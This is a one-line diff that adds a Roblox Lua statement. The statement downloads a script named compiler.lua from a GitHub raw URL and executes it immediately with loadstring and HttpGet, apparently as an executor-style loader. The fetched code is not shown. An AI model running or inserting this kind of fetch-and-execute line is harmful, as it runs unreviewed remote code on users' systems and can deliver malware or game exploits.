@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/generic-goose/Shell/refs/heads/main/Core/compiler.lua"))()
